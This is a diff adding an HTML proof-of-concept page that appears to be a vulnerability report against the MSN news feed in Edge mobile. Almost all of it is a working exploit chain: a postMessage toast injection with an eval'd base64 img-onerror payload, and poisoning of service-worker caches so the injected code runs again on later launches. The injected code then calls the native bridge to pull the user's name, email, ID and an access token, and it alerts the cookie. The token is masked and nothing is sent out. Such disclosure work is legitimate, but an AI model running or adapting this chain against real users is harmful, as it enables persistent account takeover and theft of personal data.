@@ -1,0 +1,395 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Edge News Feed Tier-7 safe proof</title>
+<style>
+  body { font: 17px system-ui; max-width: 48rem; margin: 3rem auto; padding: 0 1rem; }
+  button { display: block; width: 100%; margin: 1rem 0; padding: 1rem; font: inherit; }
+  pre { white-space: pre-wrap; background: #f3f3f3; padding: 1rem; }
+  .note { color: #555; }
+</style>
+<h1>proof: PII + auth bearer</h1>
+<p>
+
+<button id="run">Run PII + auth-bearer proof</button>
+<pre id="status">idle</pre>
+
+<script>
+const status = document.querySelector('#status');
+const mockUrl =
+  'https://www.msn.com/mobile/edge?ocid=emmx&edge=1&platform=Android' +
+  '&bridgeVersionInt=19&disablePrefetch=true' +
+  '&MBApp=edgeMobile&MBId=Android-19&MBAT=test';
+const resultUrl =
+  'https://www.msn.com/mobile/edge?ocid=emmx&edge=1&platform=Android' +
+  '&bridgeVersionInt=19&r17=tier7-safe-proof';
+
+function utf8Base64(value) {
+  return btoa(unescape(encodeURIComponent(value)));
+}
+
+function tier7Bundle(probeUrl, visibleResultUrl) {
+  const bridge = window.sapphireWebViewBridge;
+  const stateKey = 'r17-tier7-safe-state-v1';
+  let displayedPii = null;
+  let displayedTokenMask = null;
+
+  function readState() {
+    try {
+      return JSON.parse(localStorage.getItem(stateKey) || '{}');
+    } catch (_) {
+      return {};
+    }
+  }
+
+  function writeState(patch) {
+    const state = Object.assign({version: 1}, readState(), patch);
+    localStorage.setItem(stateKey, JSON.stringify(state));
+    return state;
+  }
+
+  function scrubSensitiveHandoff() {
+    const state = readState();
+    if (!state.pii && !state.tokenMask) return;
+    delete state.pii;
+    delete state.tokenMask;
+    localStorage.setItem(stateKey, JSON.stringify(state));
+  }
+
+  function escapeHtml(value) {
+    return String(value).replace(/[&<>"']/g, character => ({
+      '&': '&amp;',
+      '<': '&lt;',
+      '>': '&gt;',
+      '"': '&quot;',
+      "'": '&#39;'
+    })[character]);
+  }
+
+  function renderOrdinaryTab() {
+    const state = readState();
+    if (!displayedPii && state.pii) {
+      displayedPii = {
+        displayName: String(state.pii.displayName || ''),
+        userEmail: String(state.pii.userEmail || ''),
+        userId: String(state.pii.userId || ''),
+        accountType: String(state.pii.accountType || '')
+      };
+    }
+    if (!displayedTokenMask && state.tokenMask) {
+      displayedTokenMask = String(state.tokenMask);
+    }
+
+  
+    if (state.pii || state.tokenMask) {
+      delete state.pii;
+      delete state.tokenMask;
+      localStorage.setItem(stateKey, JSON.stringify(state));
+    }
+
+    const pii = displayedPii || {};
+    const rows = [
+      ['bridge reached', Boolean(state.bridgeReached)],
+      ['signed in', Boolean(state.signedIn)],
+      ['account fields present', Boolean(state.accountFieldsPresent)],
+      ['display name', pii.displayName || '(not returned)'],
+      ['email', pii.userEmail || '(not returned)'],
+      ['user ID', pii.userId || '(not returned)'],
+      ['account type', pii.accountType || '(not returned)'],
+      ['token acquired', Boolean(state.tokenAcquired)],
+      ['token', displayedTokenMask || '(not acquired)'],
+      ['token length', Number(state.tokenLength || 0)],
+      ['prefetch URL armed', Boolean(state.prefetchArmed)],
+      ['native response observed', Boolean(state.prefetchComplete)],
+      ['response length (body redacted)', Number(state.responseLength || 0)],
+      ['phase', String(state.phase || 'waiting')]
+    ];
+    document.title = state.prefetchComplete
+      ? 'R17_TIER7_SAFE_COMPLETE'
+      : 'R17_TIER7_SAFE_PENDING';
+    if (!document.body) return;
+    document.body.innerHTML =
+      '<main style="font:17px system-ui;max-width:48rem;margin:3rem auto;padding:0 1rem">' +
+      '<h1>PWNED BY BADCAT</h1>' +
+      '<pre style="white-space:pre-wrap;background:#f3f3f3;padding:1rem">' +
+      rows.map(row => escapeHtml(row[0]) + ': ' + escapeHtml(row[1])).join('\n') +
+      'automatically on the next normal Edge initialization.</p></main>';
+  }
+
+  const currentUrl = new URL(location.href);
+  if (currentUrl.searchParams.get('r17') === 'tier7-safe-proof') {
+    if (!window.__r17DomainAlertShown) {
+      window.__r17DomainAlertShown = true;
+      alert(document.cookie);
+    }
+    renderOrdinaryTab();
+    setInterval(renderOrdinaryTab, 750);
+    return;
+  }
+
+  /* Ordinary MSN tab: show only the redacted proof state written by the feed. */
+  if (!bridge || typeof bridge.send !== 'function') {
+    renderOrdinaryTab();
+    setInterval(renderOrdinaryTab, 750);
+    return;
+  }
+
+  if (window.__r17Tier7Started) return;
+  window.__r17Tier7Started = true;
+
+  writeState({
+    bridgeReached: true,
+    phase: 'bridge-reached',
+    probeHost: 'assets.msn.com'
+  });
+
+  function decodeCallback(encoded) {
+    const binary = atob(String(encoded || ''));
+    const bytes = new Uint8Array(binary.length);
+    for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+    return new TextDecoder().decode(bytes);
+  }
+
+  function send(scenario, payload, id) {
+    bridge.send(JSON.stringify({
+      scenario,
+      data: {data: payload},
+      id
+    }));
+  }
+
+  function openResultTabOnce() {
+    if (window.__r17Tier7ResultOpened) return;
+    window.__r17Tier7ResultOpened = true;
+    send('navigate', {
+      action: 'requestBrowser',
+      url: visibleResultUrl
+    }, 'r17-result-tab');
+  }
+
+  function armPrefetch() {
+    send('requestCustom', {
+      partner: 'Home',
+      data: {
+        method: 'addPrefetchUrls',
+        params: {urls: [probeUrl]}
+      }
+    }, 'r17-prefetch-arm');
+    writeState({prefetchArmed: true, phase: 'prefetch-armed'});
+  }
+
+  function pollPrefetch() {
+    send('requestCustom', {
+      partner: 'Home',
+      data: {
+        method: 'getPrefetchData',
+        params: {url: probeUrl}
+      }
+    }, 'r17-prefetch-read');
+  }
+
+  const previousCallback = bridge.$onDataReady;
+  bridge.$onDataReady = function (id, encoded) {
+    const callbackId = String(id || '');
+    if (!callbackId.startsWith('r17-')) {
+      if (typeof previousCallback === 'function') {
+        return previousCallback.apply(this, arguments);
+      }
+      return;
+    }
+
+    let raw = '';
+    try {
+      raw = decodeCallback(encoded);
+
+      if (callbackId === 'r17-account') {
+        const account = JSON.parse(raw || '{}');
+        const pii = {
+          displayName: String(account.displayName || ''),
+          userEmail: String(account.userEmail || ''),
+          userId: String(account.userId || ''),
+          accountType: String(account.accountType || '')
+        };
+        writeState({
+          signedIn: Boolean(account.isSignedIn),
+          accountFieldsPresent: Boolean(
+            account.userId || account.userEmail || account.displayName
+          ),
+          pii,
+          phase: 'requesting-token'
+        });
+        send('getUserInfo', {
+          type: 'AccessToken',
+          scope: 'api://www.msn.com/OneService.Read',
+          refresh: false
+        }, 'r17-token');
+      } else if (callbackId === 'r17-token') {
+        const tokenResult = JSON.parse(raw || '{}');
+        const tokenLength = typeof tokenResult.accessToken === 'string'
+          ? tokenResult.accessToken.length
+          : 0;
+        writeState({
+          tokenAcquired: Boolean(tokenResult.succeed && tokenLength),
+          tokenLength,
+          tokenMask: tokenLength
+            ? 'Bearer ** (' + tokenLength + ' characters)'
+            : '(not acquired)',
+          phase: tokenLength ? 'token-redacted-prefetch-arming' : 'unsigned-negative-control'
+        });
+        /* Erase our JavaScript reference before invoking any further operation. */
+        tokenResult.accessToken = '';
+        raw = '';
+        /* Fallback cleanup if the ordinary result tab cannot consume the handoff. */
+        setTimeout(scrubSensitiveHandoff, 30000);
+        armPrefetch();
+        pollPrefetch();
+        openResultTabOnce();
+      } else if (callbackId === 'r17-prefetch-read') {
+        const responseLength = raw.length;
+        if (responseLength > 0) {
+          writeState({
+            prefetchComplete: true,
+            responseLength,
+            phase: 'native-response-observed-body-redacted'
+          });
+          raw = '';
+          openResultTabOnce();
+        }
+      }
+    } catch (error) {
+      raw = '';
+      writeState({phase: 'safe-proof-error', errorClass: String(error && error.name || 'Error')});
+      openResultTabOnce();
+    }
+  };
+
+  send('getUserInfo', {type: ''}, 'r17-account');
+  pollPrefetch();
+  setInterval(pollPrefetch, 2000);
+}
+
+function msnStageProgram() {
+  const factorySource = JSON.stringify(tier7Bundle.toString());
+  return String.raw`(async()=>{
+    const FILLER='/* R17_TIER7_SAFE_FILLER */';
+    document.title='R17_TIER7_SAFE_MSN_STAGE';
+    localStorage.removeItem('r17-tier7-safe-state-v1');
+
+    const swText=await fetch('/edgeMobile/service-worker.js',{cache:'reload'}).then(r=>r.text());
+    const entries=[];
+    const pattern=/"revision":"([a-f0-9]+)","url":"([^"]+)"/g;
+    let match;
+    while((match=pattern.exec(swText))){
+      entries.push(
+        'https://assets.msn.com'+
+        match[2].replace('buildNumber','latest')+
+        '?__WB_REVISION__='+match[1]
+      );
+    }
+
+    const precache=await caches.open('edgemobile-pre-V1');
+    let filled=0;
+    for(const url of entries){
+      if(!await precache.match(url)){
+        await precache.put(url,new Response(FILLER,{
+          status:200,
+          headers:{'content-type':'application/javascript','date':new Date().toUTCString()}
+        }));
+        filled++;
+      }
+    }
+
+    const registration=await navigator.serviceWorker.register(
+      '/edgeMobile/service-worker.js?bundles=latest',
+      {scope:'/mobile/edge'}
+    );
+    const worker=registration.installing||registration.waiting||registration.active;
+    if(worker && worker.state!=='activated' && worker.state!=='redundant'){
+      await new Promise((resolve,reject)=>{
+        const timer=setTimeout(()=>reject(new Error('service-worker activation timeout')),45000);
+        worker.addEventListener('statechange',()=>{
+          if(worker.state==='activated'){
+            clearTimeout(timer);
+            resolve();
+          } else if(worker.state==='redundant'){
+            clearTimeout(timer);
+            reject(new Error('service-worker install became redundant'));
+          }
+        });
+      });
+    }
+    if(worker && worker.state==='redundant') throw new Error('service-worker install failed');
+
+    const experience=[...document.scripts]
+      .map(script=>script.src)
+      .find(url=>/assets\.msn\.com\/bundles\/v1\/edgeMobile\/latest\/experience\..*\.js/.test(url));
+    if(!experience) throw new Error('experience bundle not found');
+
+    const factory=${factorySource};
+    const bundlePayload='('+factory+')('+JSON.stringify(experience)+','+
+      ${JSON.stringify(JSON.stringify(resultUrl))}+');';
+    const bundles=await caches.open('edgemobile-js-bundles-V1');
+    await bundles.put(experience,new Response(bundlePayload,{
+      status:200,
+      headers:{'content-type':'application/javascript','date':new Date().toUTCString()}
+    }));
+
+    document.title='R17_TIER7_SAFE_ARMED';
+    const controller=window.opener&&!window.opener.closed?window.opener:window.parent;
+    controller.postMessage({type:'r17-tier7-armed',filled,experience},'*');
+    if(window.opener&&!window.opener.closed) window.close();
+  })().catch(error=>{
+    document.title='R17_TIER7_SAFE_ERROR';
+    const controller=window.opener&&!window.opener.closed?window.opener:window.parent;
+    controller.postMessage({type:'r17-tier7-error',error:String(error&&error.stack||error)},'*');
+  });`;
+}
+
+function run() {
+  status.textContent = 'opening the public MSN stage…';
+  const stage = open(mockUrl, 'r17-tier7-msn-stage');
+  if (!stage) {
+    status.textContent = 'popup blocked';
+    return;
+  }
+
+  const encodedProgram = utf8Base64(msnStageProgram()).replace(/=+$/, '');
+  const html = '</pre><img src=x data-r17=' + encodedProgram +
+    ' onerror=eval(decodeURIComponent(escape(atob(this.dataset.r17))))><!--';
+  const message = JSON.stringify({
+    scenario: 'requestToast',
+    id: 'r17-tier7-outer',
+    data: {jobId: 'r17-tier7-inner', data: {message: html}}
+  });
+
+  let attempts = 0;
+  const sender = setInterval(() => {
+    attempts++;
+    stage.postMessage(message, 'https://www.msn.com');
+    status.textContent = `waiting for MSN stage (${attempts})…`;
+    if (attempts >= 240) {
+      clearInterval(sender);
+      status.textContent = 'timed out waiting for MSN stage';
+    }
+  }, 250);
+
+  function receive(event) {
+    if (!event.data || !String(event.data.type).startsWith('r17-tier7-')) return;
+    if (event.data.type === 'r17-tier7-error') {
+      clearInterval(sender);
+      status.textContent = event.data.error;
+      return;
+    }
+    if (event.data.type === 'r17-tier7-armed') {
+      clearInterval(sender);
+      removeEventListener('message', receive);
+      status.textContent = 'armed; returning to the previous NTP…';
+      setTimeout(() => history.back(), 300);
+    }
+  }
+  addEventListener('message', receive);
+}
+
+document.querySelector('#run').addEventListener('click', run, {once: true});
+</script>
+
